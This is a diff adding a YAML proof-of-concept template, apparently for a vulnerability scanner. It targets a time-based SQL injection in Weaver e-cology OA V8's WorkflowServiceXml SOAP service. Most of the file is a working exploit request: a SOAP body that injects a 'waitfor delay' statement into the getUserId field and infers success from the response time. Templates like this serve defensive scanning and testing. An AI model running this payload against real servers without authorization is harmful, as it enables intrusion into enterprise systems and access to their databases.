@@ -1,0 +1,27 @@
+id: poc-yaml-weaver-ecology-oa-v8-services-sql-injection
+info:
+  name: 泛微OA Ecology OA V8 SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: e-cology
+  osprey-id: vb_2021_0035
+variables:
+  t1: random_int(5,10)
+requests:
+- method: GET
+  path: /services/WorkflowServiceXml
+  expression: 'status_code == 200 && contains(body,"Invalid SOAP request")
+
+    '
+- method: POST
+  path: /services/WorkflowServiceXml
+  headers:
+    Content-Type: text/xml;charset=UTF-8
+  data: "<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\"\
+    \ xmlns:web=\"webservices.services.weaver.com.cn\">\n <soapenv:Header/>\n <soapenv:Body>\n\
+    \  <web:getUserId>\n<web:string>loginId = ? waitfor delay '0:0:{{.t1}}' -- </web:string>\n\
+    \    <web:string>zhangsan</web:string>\n  </web:getUserId>\n </soapenv:Body>\n\
+    </soapenv:Envelope>\n"
+  expression: status_code == 200 && duration > t1 && contains(body,"<ns1:out>0</ns1:out>")
+transport: http
